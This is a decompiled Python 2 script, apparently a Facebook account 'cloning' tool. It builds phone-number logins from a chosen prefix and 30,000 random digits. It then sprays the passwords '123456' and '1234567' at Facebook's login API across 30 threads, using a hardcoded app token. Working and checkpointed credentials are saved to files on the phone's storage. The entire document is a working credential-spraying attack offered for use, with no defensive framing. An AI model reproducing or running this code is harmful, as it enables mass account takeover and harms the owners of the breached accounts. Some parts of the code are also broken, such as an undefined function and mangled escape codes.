# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(30000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 clone.py')
    os.system('xdg-open https://youtube.com/channel/UCoCVfFSoXWVF6_lIPUSMu1w')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mstart cloning \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print
logo = """
\x1b[1;92m 
   _____ __               _ ____
  / ___// /_  ____ ______(_) __/
  \__ \/ __ \/ __ `/ ___/ / /_  
 ___/ / / / / /_/ / /  / / __/    \x1b[1;91m  
/____/_/ /_/\__,_/_/  /_/_/     
                                

"""
def login():
    os.system('clear')
    print logo
    print '\x1b[1;92m[1]  Start Cracking'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \x1b[1;92m Back'
    time.sleep(0.05)
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;92mCHOOSE:\x1b[1;92m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo
        print 48 * '\x1b[1;92m~'
        print '\x1b[1;92m CHOOSE YOU CODE'
        print '\x1b[1;92m 01,02,03,04,05,06,07,08,09,10,11'
        print '\x1b[1;92m 12,13,14,15,16,17,18,19,20,21,22'
        try:
            c = raw_input('\x1b[1;92m CHOOSE : ')
            k = '1'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            blackmafiax()

    elif peak == '0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50 * '\x1b[1;92m-'
    xxx = str(len(id))
    os.system('clear')
    print logo
    print 48 * '\x1b[1;92m~'
    jalan('\x1b[1;92m TOTAL IDZ NUMBER: ' + xxx)
    jalan('\x1b[1;92m CODE YOU CHOOSE: ' +k+c)
    jalan('\x1b[1;92m TO STOP THIS PROCESS Ctrl+z')
    print 48 * '\x1b[1;92m~'

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = '123456'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass1
                okb = open('/sdcard/ok_cloned.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m(CP) ' + k + c + user + '  |  ' + pass1
                cps = open('/sdcard/cp_cloned.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234567'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[SHARIF(OK)  ' + k + c + user + '  |  ' + pass2
                    okb = open('/sdcard/ok_cloned.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[SHARIF(CP) ' + k + c + user + '  |  ' + pass2
                    cps = open('/sdcard/cp_cloned.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                        
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '\x1b[1;92m-'
    print ' Process Has Been Completed'
    print 'Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print ' Cloned Accounts Has Been Saved : save/cloned.txt'
    jalan('Note : Your (CP)Accounts Open after 7/10 days')
    print ''
    raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;92m]')
    login()


if __name__ == '__main__':
    login()
